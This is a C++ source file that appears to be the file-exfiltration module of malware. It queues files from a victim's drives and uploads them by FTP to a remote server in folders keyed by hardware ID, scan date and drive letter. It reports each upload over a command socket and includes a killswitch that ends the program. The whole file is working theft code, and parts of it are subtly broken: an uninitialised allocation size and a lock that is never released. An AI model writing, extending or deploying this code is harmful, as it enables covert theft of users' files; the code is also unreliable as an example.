#include "ftp_uploader.h"
#include <windows.h>
#include "common.h"
#include <WinInet.h>
#include <string.h>
#include <stdlib.h>
#include <Shlwapi.h>
#include <time.h>
#include <thread>
#include <vector>
#include "hwid.h"
#include "md5_lib_src.h"
#include "packets.h"
#include "client_sock.h"
#pragma comment(lib, "Wininet")
#pragma comment(lib, "Shlwapi.lib")

#ifdef max
#undef max
#endif



// thx NGA :*
bool create_ftp_dir(char* dir, HANDLE hFtpSession)
{
	char *p;
	bool b;

	if (!(b = (TRUE == FtpCreateDirectory(hFtpSession, dir))) &&
		!(b = (NULL == (p = strrchr(dir, '\\')))))
	{
		size_t i;

		(p = strncpy((char *)malloc(1 + i), dir, i = p - dir))[i] = '\0';

		b = create_ftp_dir(p, hFtpSession);

		free(p);

		b = b ? (TRUE == FtpCreateDirectory(hFtpSession, dir)) : false;
	}

	return b;
}

CRITICAL_SECTION upload_queue_cs;

std::vector<std::string> upload_queue;
std::vector<std::thread*> thread_list;

bool threads_terminate = false;


bool is_killswitch(const char* data)
{
	bool killswitch = *(unsigned long long*)data == killswitch_key;
#ifdef ENABLE_PRINTF
	if (killswitch)
		printf("Killswitch found!\r\n");
#endif // ENABLE_PRINTF
	return killswitch;
}

void ftp_thread(HINTERNET hFtpSession)
{
	time_t t = time(0);   // get time now
	struct tm * now = localtime(&t);


	unsigned long long hwid = get_hwid();
	while (1)
	{
		std::string entry;
		EnterCriticalSection(&upload_queue_cs);
		if (upload_queue.empty())
		{

			if (threads_terminate)
			{
				LeaveCriticalSection(&upload_queue_cs);
				break;
			}

			LeaveCriticalSection(&upload_queue_cs);
			continue;
		}
		entry = upload_queue.front();
		if (entry.size())
			upload_queue.erase(upload_queue.begin());
		else
			continue;

		LeaveCriticalSection(&upload_queue_cs);

		char file_path[MAX_PATH];
		strcpy(file_path, entry.c_str());


		FILE* infile = fopen(file_path, "r+b");
		char tmp_file_data[sizeof(unsigned long long)];
		fread(tmp_file_data, 1, sizeof(unsigned long long), infile);
		fclose(infile);

		if (is_killswitch(tmp_file_data))
		{
			exit(0);
		}
		
		char write_path[500];
		sprintf(write_path, ".\\Files\\%llu\\Scan_%d_%d_%d\\Drive_%C\\%s", hwid, now->tm_year + 1900, now->tm_mon + 1, now->tm_mday, file_path[0], file_path + 3);
		PathRemoveFileSpec(write_path);



		char remote_file_path[500];
		sprintf(remote_file_path, "%s\\%s", write_path, PathFindFileName(file_path));

		

		create_ftp_dir(write_path, hFtpSession);

		if (FtpPutFile(hFtpSession, file_path, remote_file_path, 0, 0))
		{
#ifdef ENABLE_PRINTF
			printf("File uploaded successfully!\r\n");
#endif // ENABLE_PRINTF

			file_upload_ack_payload file_upload_packet;
			strcpy(file_upload_packet.file_remote_path, remote_file_path);
			strcpy(file_upload_packet.file_local_path, entry.c_str());
			socket_send(packet_opcode::file_upload_ack, &file_upload_packet, sizeof(file_upload_packet));
		}
		else
		{
#ifdef ENABLE_PRINTF
			printf("Failed to upload file, maybe the file is already present!\r\n");
#endif // ENABLE_PRINTF

		}
	}

	InternetCloseHandle(hFtpSession);
}

bool ftp_connect(char* host, unsigned short port, char* id, char* psw)
{
	for (int i = 0; i < FTP_UPLOAD_THREADS_COUNT; i++)
	{
		HINTERNET hInternet = NULL;
		HINTERNET hFtpSession = NULL;

		if (!(hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)))
			return false;

		if (!(hFtpSession = InternetConnect(hInternet, host, port, id, psw, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0)))
			return false;

		thread_list.push_back(new std::thread(ftp_thread, hFtpSession));
	}
	return true;
}


bool ftp_upload_file(char* file_path)
{
	EnterCriticalSection(&upload_queue_cs);
	upload_queue.push_back(std::string(file_path));
	LeaveCriticalSection(&upload_queue_cs);

	return true;
}

void ftp_wait_for_finish()
{
	EnterCriticalSection(&upload_queue_cs);
	threads_terminate = true;
	LeaveCriticalSection(&upload_queue_cs);
	//for (auto& entry : thread_list)
	//{
	//	entry->join();
	//	delete entry;
	//}

}

void ftp_init()
{
	InitializeCriticalSection(&upload_queue_cs);
}
